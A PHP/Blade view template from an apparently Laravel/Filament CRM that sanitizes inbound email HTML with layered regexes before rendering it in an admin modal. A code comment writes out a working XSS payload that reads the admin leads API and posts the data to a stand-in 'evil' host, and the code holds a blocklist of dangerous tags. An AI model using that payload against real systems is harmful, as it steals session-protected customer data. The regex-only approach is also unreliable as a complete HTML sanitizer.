@php
    // Used by the Lead emails relation manager to render stored `body_html`
    // inside a view modal.  Important note: the prior docblock
    // claimed "inbound emails go through the IMAP connector which already
    // strips dangerous headers" — that is INCORRECT.  webklex/php-imap
    // parses MIME headers, it does NOT sanitize the HTML body of an
    // inbound email.  An external attacker can email a tenant's
    // IMAP-connected mailbox with `<script>fetch('/admin/api/leads.json')
    // .then(r => r.json()).then(d => fetch('//evil/exfil', {method:'POST',
    // body: JSON.stringify(d)}))</script>` and when the tenant admin opens
    // the conversation thread the script executes in the Filament admin
    // context — full session takeover.  Applies the same 4-layer regex
    // sanitizer used in landing/sections/html and public/static-page
    // (earlier hardening) so inbound + outbound HTML both render defanged.
    //
    // After sanitization we ALSO add the existing target="_blank" +
    // rel="noopener noreferrer" rewrite so external links don't reverse-
    // tabnab the admin tab.  Order matters: sanitize FIRST, then rewrite
    // links (so the rewrite operates on already-cleaned markup).
    $html = $getState();

    if (is_string($html) && $html !== '') {
        // Layer 1: strip <script> tags (open + self-closing), 2-pass to
        // defeat nested-tag bypass like <scr<script>ipt>.
        for ($pass = 0; $pass < 2; $pass++) {
            $html = preg_replace('#<script\b[^>]*>.*?</script>#is', '', $html);
            $html = preg_replace('#<script\b[^>]*/?>#is', '', $html);
        }

        // Layer 2: strip dangerous tags wholesale.  Inbound email
        // bodies legitimately use <p>/<a>/<img>/<table>/<strong>/<em>
        // etc., so the allowlist stays permissive; the BLOCKLIST below
        // catches script-equivalent vectors.
        $dangerousTags = '(?:style|iframe|frame|frameset|object|embed|applet|link|base|meta|form|input|button|textarea|select|option|svg|math|template|portal|xmp|plaintext|noembed|noscript)';
        for ($pass = 0; $pass < 2; $pass++) {
            $html = preg_replace('#<' . $dangerousTags . '\b[^>]*>.*?</' . $dangerousTags . '>#is', '', $html);
            $html = preg_replace('#<' . $dangerousTags . '\b[^>]*/?>#is', '', $html);
        }

        // Layer 3: strip event-handler attributes on any tag.
        $html = preg_replace('#\son[a-z]+\s*=\s*"[^"]*"#i', '', $html);
        $html = preg_replace("#\son[a-z]+\s*=\s*'[^']*'#i", '', $html);
        $html = preg_replace('#\son[a-z]+\s*=\s*[^\s>]+#i', '', $html);

        // Layer 4: defang dangerous URI schemes on URL-bearing attrs.
        $html = preg_replace(
            '#\s+(href|src|action|formaction|background|poster|cite|longdesc|srcset|data|manifest|ping|archive)\s*=\s*("|\')?\s*(?:javascript|vbscript|data|file)\s*:#i',
            ' data-blocked-uri-$1=$2',
            $html
        );

        // Final: force every remaining <a> to open in a new tab with
        // rel=noopener noreferrer (reverse-tabnabbing defense).
        $html = preg_replace('/<a\s+([^>]*?)>/i', '<a $1 target="_blank" rel="noopener noreferrer">', $html);
    }
@endphp
<link rel="stylesheet" href="{{ asset('css/views/filament/components/raw-html.css') }}">
<div class="border border-gray-200 dark:border-gray-700 rounded-lg p-4 bg-white dark:bg-gray-900 rh-sandbox">
    @if(is_string($html) && $html !== '')
        {!! $html !!}
    @else
        <p class="text-sm text-gray-400 italic">{{ __('filament/raw_html.no_html_body_placeholder') }}</p>
    @endif
</div>
